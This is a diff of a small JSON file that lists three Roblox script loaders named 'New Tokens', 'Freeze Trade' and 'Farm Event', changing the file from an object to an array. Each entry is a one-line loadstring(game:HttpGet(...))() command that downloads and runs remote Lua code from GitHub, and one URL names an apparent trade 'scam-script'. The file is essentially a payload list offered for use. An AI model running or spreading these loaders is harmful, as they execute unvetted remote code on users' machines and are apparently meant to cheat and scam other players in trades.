@@ -1,5 +1,14 @@
-{
-  "MM_2": "loadstring(game:HttpGet(\"https://raw.githubusercontent.com/Ziadian/elysm-escapetsunami/refs/heads/main/New-op-token%20multipilerscript.lua\"))()",
-  "freeze_trade": "loadstring(game:HttpGet(\"https://raw.githubusercontent.com/Ziadian/starhubs/refs/heads/main/ETFB-optrade%20scam-script.lua\"))()",
-  "farm_event": "loadstring(game:HttpGet(\"https://raw.githubusercontent.com/Ziadian/elysm-escapetsunami/refs/heads/main/opscript.lua\"))()"
-}
+[
+  {
+    "name": "New Tokens",
+    "content": "loadstring(game:HttpGet(\"https://raw.githubusercontent.com/Ziadian/elysm-escapetsunami/refs/heads/main/New-op-token%20multipilerscript.lua\"))()"
+  },
+  {
+    "name": "Freeze Trade",
+    "content": "loadstring(game:HttpGet(\"https://raw.githubusercontent.com/Ziadian/starhubs/refs/heads/main/ETFB-optrade%20scam-script.lua\"))()"
+  },
+  {
+    "name": "Farm Event",
+    "content": "loadstring(game:HttpGet(\"https://raw.githubusercontent.com/Ziadian/elysm-escapetsunami/refs/heads/main/opscript.lua\"))()"
+  }
+]
